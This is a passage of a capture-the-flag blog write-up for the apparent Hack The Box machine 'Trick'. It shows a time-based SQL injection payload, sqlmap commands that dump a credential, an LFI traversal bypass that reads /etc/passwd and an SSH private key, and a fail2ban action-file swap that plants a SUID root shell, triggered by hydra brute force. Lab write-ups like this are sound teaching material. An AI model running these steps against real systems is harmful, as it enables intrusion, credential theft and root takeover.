+</span></span><span class="line"><span class="cl">    Payload: <span class="nv">username</span><span class="o">=</span>root<span class="s1">&#39; AND (SELECT 5929 FROM (SELECT(SLEEP(5)))BHkw) AND &#39;</span>VzCS<span class="s1">&#39;=&#39;</span>VzCS<span class="p">&amp;</span><span class="nv">password</span><span class="o">=</span>root
+</span></span><span class="line"><span class="cl">---
+</span></span><span class="line"><span class="cl"><span class="o">[</span>11:08:43<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
+</span></span></code></pre></div><p>Confirmed. Dumped databases and found <code>payroll_db</code>, then enumerated its tables:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/trick ❯ sqlmap -r login_req --dbs --batch
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>11:41:25<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> retrieved: payroll_db
+</span></span><span class="line"><span class="cl">available databases <span class="o">[</span>2<span class="o">]</span>:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> information_schema
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> payroll_db
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/trick ❯ sqlmap -r login_req -D payroll_db --tables --batch
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>11:57:27<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> adjusting <span class="nb">time</span> delay to <span class="m">1</span> second due to good response <span class="nb">times</span>
+</span></span><span class="line"><span class="cl"><span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>11:57:30<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> retrieved: position
+</span></span><span class="line"><span class="cl"><span class="o">[</span>11:58:06<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> retrieved: employee
+</span></span><span class="line"><span class="cl"><span class="o">[</span>11:58:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> retrieved: department
+</span></span><span class="line"><span class="cl"><span class="o">[</span>11:59:22<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> retrieved: payroll_items
+</span></span><span class="line"><span class="cl"><span class="o">[</span>12:00:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> retrieved: attendance
+</span></span><span class="line"><span class="cl"><span class="o">[</span>12:00:59<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> retrieved: employee_deductions
+</span></span><span class="line"><span class="cl"><span class="o">[</span>12:02:20<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> retrieved: employee_allowances
+</span></span><span class="line"><span class="cl"><span class="o">[</span>12:03:09<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> retrieved: users
+</span></span><span class="line"><span class="cl"><span class="o">[</span>12:03:29<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> retrieved: deductions
+</span></span><span class="line"><span class="cl"><span class="o">[</span>12:04:10<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> retrieved: payrol
+</span></span></code></pre></div><p><code>users</code> table. Dumped it:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/trick ❯ sqlmap -r login_req -D payroll_db -T users -C username,password --dump --batch
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>12:10:19<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> adjusting <span class="nb">time</span> delay to <span class="m">1</span> second due to good response <span class="nb">times</span>
+</span></span><span class="line"><span class="cl">SuperGucciRainbowCake
+</span></span><span class="line"><span class="cl"><span class="o">[</span>12:11:43<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> retrieved: Enemigosss
+</span></span><span class="line"><span class="cl">Database: payroll_db
+</span></span><span class="line"><span class="cl">Table: users
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="m">1</span> entry<span class="o">]</span>
+</span></span><span class="line"><span class="cl">+------------+-----------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> username   <span class="p">|</span> password              <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------------+-----------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Enemigosss <span class="p">|</span> SuperGucciRainbowCake <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------------+-----------------------+
+</span></span></code></pre></div><p>Logged in:</p>
+<p><img src="/images/writeups/htb-trick/web-payroll-admin-panel.png" alt="Payroll admin panel after login showing employee records and management sidebar"></p>
+<p>The payroll app had a <code>page=</code> parameter that looked like it was including files. I tried LFI immediately - <code>page=/etc/passwd</code>, <code>page=../../../etc/passwd</code>, various traversal sequences. All filtered. None of them returned file content.</p>
+<h2 id="lfi-on-preprod-marketing">LFI on preprod-marketing</h2>
+<p>The subdomain name <code>preprod-payroll</code> is a naming convention. Payroll is the noun, preprod is the prefix. If there are other apps, they&rsquo;d follow the same pattern: <code>preprod-&lt;appname&gt;</code>. I fuzzed that prefix:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">~ ❯ ffuf -u http://trick.htb -H <span class="s2">&#34;Host: preprod-FUZZ.trick.htb&#34;</span> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302 -fw <span class="m">1697</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">marketing               <span class="o">[</span>Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 71ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">payroll                 <span class="o">[</span>Status: 302, Size: 9546, Words: 1453, Lines: 267, Duration: 92ms<span class="o">]</span>
+</span></span></code></pre></div><p><code>preprod-marketing.trick.htb</code>. Also 200. This one also had a <code>page=</code> parameter, and this time the LFI wasn&rsquo;t filtered:</p>
+<p><img src="/images/writeups/htb-trick/web-preprod-marketing-lfi.png" alt="preprod-marketing.trick.htb with page= parameter returning file contents via LFI"></p>
+<p>The traversal that worked used <code>....//</code> sequences instead of <code>../</code>. The double-dot double-slash pattern bypasses naive string replacement that only strips <code>../</code> once: replacing <code>....//</code> gives <code>../</code>, so one round of filtering leaves a working traversal intact.</p>
+<p><code>/etc/passwd</code> confirmed two shell users:</p>
+<p><img src="/images/writeups/htb-trick/lfi-etc-passwd-output.png" alt="/etc/passwd contents showing root and michael with /bin/bash login shells"></p>
+<p>From there I read michael&rsquo;s SSH key. The <code>authorized_keys</code> request confirmed SSH was set up, and reading <code>/home/michael/.ssh/id_rsa</code> gave the private key:</p>
+<p><img src="/images/writeups/htb-trick/burp-lfi-id-rsa-response.png" alt="Burp Suite showing LFI response with michael’s RSA private key material from /home/michael/.ssh/"></p>
+<p>Saved the key, set permissions, SSH&rsquo;d in as michael. User flag.</p>
+<h2 id="privilege-escalation-fail2ban">Privilege Escalation: fail2ban</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">michael@trick:~$ whoami<span class="p">;</span> id
+</span></span><span class="line"><span class="cl">michael
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>michael<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>michael<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>michael<span class="o">)</span>,1002<span class="o">(</span>security<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">michael@trick:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> michael on trick:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User michael may run the following commands on trick:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/fail2ban restart
+</span></span></code></pre></div><p>Two things: member of <code>security</code> group, and can restart fail2ban as root without a password. Let me explain why that&rsquo;s exploitable.</p>
+<p><em>Reference: <a href="https://juggernaut-sec.com/fail2ban-lpe/">juggernaut-sec.com/fail2ban-lpe</a></em></p>
+<p>fail2ban monitors log files for brute-force patterns and responds by executing a configured <em>action</em>, typically an iptables rule to block the offending IP. Those actions are shell commands defined in config files under <code>/etc/fail2ban/action.d/</code>. When fail2ban is restarted it re-reads all config from disk. The <code>security</code> group controls the <code>action.d/</code> directory:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">michael@trick:~$ ls -la /etc/fail2ban/
+</span></span><span class="line"><span class="cl">total <span class="m">76</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">6</span> root root      <span class="m">4096</span> Jun  <span class="m">8</span> 13:36 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">126</span> root root     <span class="m">12288</span> Jun  <span class="m">8</span> 13:24 ..
+</span></span><span class="line"><span class="cl">drwxrwx---   <span class="m">2</span> root security  <span class="m">4096</span> Jun  <span class="m">8</span> 13:36 action.d
+</span></span><span class="line"><span class="cl">-rw-r--r--   <span class="m">1</span> root root      <span class="m">2334</span> Jun  <span class="m">8</span> 13:36 fail2ban.conf
+</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">2</span> root root      <span class="m">4096</span> Jun  <span class="m">8</span> 13:36 fail2ban.d
+</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">3</span> root root      <span class="m">4096</span> Jun  <span class="m">8</span> 13:36 filter.d
+</span></span><span class="line"><span class="cl">-rw-r--r--   <span class="m">1</span> root root     <span class="m">22908</span> Jun  <span class="m">8</span> 13:36 jail.conf
+</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">2</span> root root      <span class="m">4096</span> Jun  <span class="m">8</span> 13:36 jail.d
+</span></span><span class="line"><span class="cl">-rw-r--r--   <span class="m">1</span> root root       <span class="m">645</span> Jun  <span class="m">8</span> 13:36 paths-arch.conf
+</span></span><span class="line"><span class="cl">-rw-r--r--   <span class="m">1</span> root root      <span class="m">2827</span> Jun  <span class="m">8</span> 13:36 paths-common.conf
+</span></span><span class="line"><span class="cl">-rw-r--r--   <span class="m">1</span> root root       <span class="m">573</span> Jun  <span class="m">8</span> 13:36 paths-debian.conf
+</span></span><span class="line"><span class="cl">-rw-r--r--   <span class="m">1</span> root root       <span class="m">738</span> Jun  <span class="m">8</span> 13:36 paths-opensuse.conf
+</span></span></code></pre></div><p><code>action.d</code> is <code>rwxrwx---</code> owned by <code>root:security</code>. I can create and delete files there. The individual config files inside are owned by root with no write permissions for me, but the directory write permission means I can delete a file and replace it with one I control.</p>
+<p>Checked <code>jail.conf</code> to understand which action file gets used and what the ban timing is:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">michael@trick:~$ cat /etc/fail2ban/jail.conf <span class="p">|</span> grep -A5 <span class="s2">&#34;sshd&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sshd<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">port</span>    <span class="o">=</span> ssh
+</span></span><span class="line"><span class="cl"><span class="nv">logpath</span> <span class="o">=</span> %<span class="o">(</span>sshd_log<span class="o">)</span>s
+</span></span><span class="line"><span class="cl"><span class="nv">backend</span> <span class="o">=</span> %<span class="o">(</span>sshd_backend<span class="o">)</span>s
+</span></span><span class="line"><span class="cl"><span class="nv">bantime</span> <span class="o">=</span> 10s
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">michael@trick:~$ grep <span class="s2">&#34;banaction&#34;</span> /etc/fail2ban/jail.conf <span class="p">|</span> head -5
+</span></span><span class="line"><span class="cl"><span class="nv">banaction</span> <span class="o">=</span> iptables-multiport
+</span></span><span class="line"><span class="cl"><span class="nv">banaction_allports</span> <span class="o">=</span> iptables-allports
+</span></span></code></pre></div><p><code>bantime = 10s</code> and <code>banaction = iptables-multiport</code>. The <code>iptables-multiport.conf</code> action file is what gets executed when fail2ban decides to ban an IP. The <code>actionban</code> directive in that file is the shell command that runs, as root, because fail2ban runs as root.</p>
+<p>The exploit:</p>
+<ol>
+<li>Delete <code>iptables-multiport.conf</code> from <code>action.d/</code> (allowed because we can write to the directory)</li>
+<li>Copy it to <code>/tmp</code>, edit <code>actionban</code> to copy bash and set SUID</li>
+<li>Copy the modified version back into <code>action.d/</code></li>
+<li>Restart fail2ban with sudo so it loads the new config</li>
+<li>Trigger an SSH brute-force against the box so fail2ban fires the ban action</li>
+<li>Run the SUID binary</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">michael@trick:~$ rm /etc/fail2ban/action.d/iptables-multiport.conf
+</span></span><span class="line"><span class="cl">rm: remove write-protected regular file <span class="s1">&#39;/etc/fail2ban/action.d/iptables-multiport.conf&#39;</span>? y
+</span></span><span class="line"><span class="cl">michael@trick:~$ cp /tmp/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf
+</span></span><span class="line"><span class="cl">michael@trick:~$ sudo /etc/init.d/fail2ban restart
+</span></span><span class="line"><span class="cl"><span class="o">[</span> ok <span class="o">]</span> Restarting fail2ban <span class="o">(</span>via systemctl<span class="o">)</span>: fail2ban.service.
+</span></span></code></pre></div><p>The modified <code>actionban</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">actionban</span> <span class="o">=</span> cp /bin/bash /tmp/kanyo<span class="p">;</span> chmod <span class="m">4755</span> /tmp/kanyo
+</span></span></code></pre></div><p>Then triggered the ban with hydra:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">~ ✗ hydra -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt ssh://10.129.227.180
+</span></span><span class="line"><span class="cl">Hydra v9.7 <span class="o">(</span>c<span class="o">)</span> <span class="m">2023</span> by van Hauser/THC <span class="p">&amp;</span> David Maciejak - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes <span class="o">(</span>this is non-binding, these *** ignore laws and ethics anyway<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2026-06-08 12:50:55
+</span></span><span class="line"><span class="cl"><span class="o">[</span>WARNING<span class="o">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span class="m">4</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> max <span class="m">16</span> tasks per <span class="m">1</span> server, overall <span class="m">16</span> tasks, <span class="m">92</span> login tries <span class="o">(</span>l:1/p:92<span class="o">)</span>, ~6 tries per task
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> attacking ssh://10.129.227.180:22/
+</span></span><span class="line"><span class="cl"><span class="m">1</span> of <span class="m">1</span> target completed, <span class="m">0</span> valid password found
+</span></span><span class="line"><span class="cl">Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2026-06-08 12:51:30
+</span></span></code></pre></div><p>Back on the box:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">michael@trick:/tmp$ ls
+</span></span><span class="line"><span class="cl">iptables-multiport.conf
+</span></span><span class="line"><span class="cl">kanyo
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">michael@trick:/tmp$ /tmp/kanyo -p
+</span></span><span class="line"><span class="cl">kanyo-5.0# whoami
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">kanyo-5.0# <span class="nb">cd</span> /root
+</span></span></code></pre></div><p>Root flag.</p>
+<p>The fail2ban abuse is one of those privescs that feels inevitable once you see the setup. Write access to action configs plus a NOPASSWD service restart is a complete chain: you control what runs as root and you control when it runs. The 10-second ban time is tight but hydra hammers fast enough that it trips the threshold. Worth keeping in mind any time you see a user in a group with names like <code>security</code>, <code>monitoring</code>, or <code>log</code>. Those often have write access to config files that feed into services running as root.</p>
+
+            </div>
+        </article></main>
+</div>
+
+<script>
+    function toggleToc() {
+        const content = document.getElementById('tocContent');
+        const button = document.querySelector('.toc-toggle');
+        if (!content || !button) return;
+        content.classList.toggle('expanded');
+        button.classList.toggle('expanded');
+    }
+
+    function toggleMiniToc() {
+        const miniToc = document.getElementById('miniToc');
+        if (miniToc) miniToc.classList.toggle('minimized');
+    }
+
+    function setupActiveHighlighting(links) {
+        const targets = Array.from(links).map(link => {
+            const href = link.getAttribute('href');
+            if (href && href.startsWith('#')) {
+                const el = document.getElementById(decodeURIComponent(href.slice(1)));
+                if (el) return { link, element: el };
+            }
+            return null;
+        }).filter(Boolean);
+
+        if (targets.length === 0) return;
+
+        function update() {
+            const scrollPosition = window.scrollY + 100;
+            let active = null;
+            targets.forEach(t => {
+                if (t.element.offsetTop <= scrollPosition) active = t;
+            });
+            links.forEach(l => l.classList.remove('active'));
+            if (active) active.link.classList.add('active');
+        }
+
+        let ticking = false;
+        window.addEventListener('scroll', () => {
+            if (!ticking) {
+                requestAnimationFrame(() => { update(); ticking = false; });
+                ticking = true;
+            }
+        });
+        update();
+    }
+
+    function initMiniToc() {
+        const miniToc = document.getElementById('miniToc');
+        const miniTocContent = document.getElementById('miniTocContent');
+        const sourceToc = document.getElementById('tocContent');
+        if (!miniToc || !miniTocContent || !sourceToc) return;
+
+        const clone = sourceToc.cloneNode(true);
+        clone.classList.remove('toc-content', 'expanded');
+        clone.removeAttribute('id');
+
+        const links = clone.querySelectorAll('a');
+        if (links.length === 0) return;
+
+        links.forEach(link => {
+            link.addEventListener('click', (e) => {
+                const href = link.getAttribute('href');
+                if (href && href.startsWith('#')) {
+                    const target = document.getElementById(decodeURIComponent(href.slice(1)));
+                    if (target) {
+                        e.preventDefault();
+                        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                        history.pushState(null, '', href);
+                    }
+                }
+            });
+        });
+
+        miniTocContent.appendChild(clone);
+        miniToc.classList.add('visible');
+        setupActiveHighlighting(links);
+    }
+
+    document.addEventListener('DOMContentLoaded', initMiniToc);
+</script>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://discord.com/users/kanyo._" target="_blank" rel="noopener noreferrer me"
+    title="Discord"><svg xmlns="http://www.w3.org/2000/svg" viewBox="20 15 205 190" fill="currentColor" stroke="none">
+    <path
+        d="M104.4 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zM140.9 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z" />
+    <path
+        d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2 0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6 0 0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3 0 0-8.5 14.5-30.6 15.2z" />
+</svg></a>
+<a href="https://github.com/Chaelsoo" target="_blank" rel="noopener noreferrer me"
+    title="Github"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg></a>
+<a href="https://www.linkedin.com/in/abderrahmen-dellaa-a78517249/" target="_blank" rel="noopener noreferrer me"
+    title="Linkedin"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
+    <rect x="2" y="9" width="4" height="12"></rect>
+    <circle cx="4" cy="4" r="2"></circle>
+</svg></a>
+<a href="https://app.hackthebox.com/users/1490281" target="_blank" rel="noopener noreferrer me"
+    title="Hackthebox"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1L2 6.5v11L12 23l10-5.5v-11L12 1z"></path><path d="M12 12L2 6.5M12 12v11M12 12l10-5.5"></path></svg></a>
+</div>
+    <small class="footer_copyright">
+        © 2026 .
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+
+
+
+
+    
+
+
+
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js"></script>
+
+    
+
+</body>
+</html>
